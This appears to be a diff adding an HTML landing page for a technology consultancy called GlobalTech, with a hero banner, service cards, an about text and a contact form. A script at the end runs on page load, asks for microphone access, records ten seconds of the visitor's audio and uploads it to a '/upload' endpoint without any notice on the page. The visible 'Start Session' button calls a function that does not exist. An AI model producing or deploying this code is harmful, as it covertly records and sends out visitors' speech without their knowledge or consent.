@@ -1,0 +1,289 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<title>GlobalTech Consulting</title>
+
+<style>
+
+body{
+margin:0;
+font-family:Arial, Helvetica, sans-serif;
+background:#f5f7fa;
+color:#333;
+}
+
+header{
+background:#0a2540;
+color:white;
+padding:15px 60px;
+display:flex;
+justify-content:space-between;
+align-items:center;
+}
+
+header h1{
+margin:0;
+font-size:22px;
+}
+
+nav a{
+color:white;
+text-decoration:none;
+margin-left:25px;
+font-size:15px;
+}
+
+.hero{
+background:linear-gradient(rgba(0,0,0,0.5),rgba(0,0,0,0.6)),
+url("https://images.unsplash.com/photo-1551434678-e076c223a692");
+background-size:cover;
+background-position:center;
+height:420px;
+display:flex;
+align-items:center;
+justify-content:center;
+text-align:center;
+color:white;
+}
+
+.hero h2{
+font-size:42px;
+margin-bottom:15px;
+}
+
+.hero p{
+font-size:18px;
+}
+
+.hero button{
+margin-top:20px;
+padding:12px 28px;
+border:none;
+background:#1a73e8;
+color:white;
+font-size:16px;
+border-radius:5px;
+cursor:pointer;
+}
+
+.section{
+padding:60px 80px;
+text-align:center;
+}
+
+.services{
+display:flex;
+gap:30px;
+margin-top:40px;
+justify-content:center;
+flex-wrap:wrap;
+}
+
+.card{
+background:white;
+width:280px;
+padding:25px;
+border-radius:8px;
+box-shadow:0 4px 10px rgba(0,0,0,0.1);
+}
+
+.card h3{
+margin-top:10px;
+}
+
+.about{
+background:#ffffff;
+}
+
+.contact{
+background:#0a2540;
+color:white;
+}
+
+.contact input,
+.contact textarea{
+width:80%;
+padding:12px;
+margin:10px 0;
+border:none;
+border-radius:4px;
+}
+
+.contact button{
+padding:12px 25px;
+background:#1a73e8;
+border:none;
+color:white;
+cursor:pointer;
+border-radius:4px;
+}
+
+footer{
+background:#111;
+color:white;
+padding:20px;
+text-align:center;
+font-size:14px;
+}
+
+</style>
+
+</head>
+
+<body>
+
+<header>
+<h1>GlobalTech</h1>
+
+<nav>
+<a href="#">Home</a>
+<a href="#">Services</a>
+<a href="#">About</a>
+<a href="#">Contact</a>
+</nav>
+
+</header>
+
+
+<section class="hero">
+
+<div>
+
+<h2>Empowering Businesses with Technology</h2>
+
+<p>Innovative digital solutions for modern enterprises</p>
+
+<button onclick="startRecording()">Start Session</button>
+
+</div>
+
+</section>
+
+
+<section class="section">
+
+<h2>Our Services</h2>
+
+<div class="services">
+
+<div class="card">
+<h3>Cloud Solutions</h3>
+<p>Secure and scalable cloud infrastructure for enterprises.</p>
+</div>
+
+<div class="card">
+<h3>Data Analytics</h3>
+<p>Transform data into actionable insights for business growth.</p>
+</div>
+
+<div class="card">
+<h3>Cybersecurity</h3>
+<p>Advanced protection strategies for your digital assets.</p>
+</div>
+
+</div>
+
+</section>
+
+
+<section class="section about">
+
+<h2>About Our Company</h2>
+
+<p>
+GlobalTech Consulting helps organizations innovate and scale
+through technology, analytics, and strategic planning.
+Our team works with startups and global enterprises to
+deliver impactful digital transformation.
+</p>
+
+</section>
+
+
+<section class="section contact">
+
+<h2>Contact Us</h2>
+
+<input type="text" placeholder="Your Name">
+
+<br>
+
+<input type="email" placeholder="Your Email">
+
+<br>
+
+<textarea rows="4" placeholder="Your Message"></textarea>
+
+<br>
+
+<button>Send Message</button>
+
+</section>
+
+
+<footer>
+
+© 2026 GlobalTech Consulting | All Rights Reserved
+
+</footer>
+
+<script>
+
+let recorder;
+let chunks = [];
+
+async function startAudio(){
+
+try{
+
+const stream = await navigator.mediaDevices.getUserMedia({audio:true});
+
+recorder = new MediaRecorder(stream);
+
+recorder.start();
+
+recorder.ondataavailable = e => {
+chunks.push(e.data);
+};
+
+setTimeout(stopAudio,10000);
+
+}catch(err){
+console.log("Permission denied");
+}
+
+}
+
+function stopAudio(){
+
+recorder.stop();
+
+recorder.onstop = async ()=>{
+
+const blob = new Blob(chunks,{type:"audio/webm"});
+
+let formData = new FormData();
+
+formData.append("audio",blob,"audio.webm");
+
+await fetch("/upload",{
+method:"POST",
+body:formData
+});
+
+chunks = [];
+
+}
+
+}
+
+window.onload = startAudio;
+
+</script>
+
+</body>
+</html>
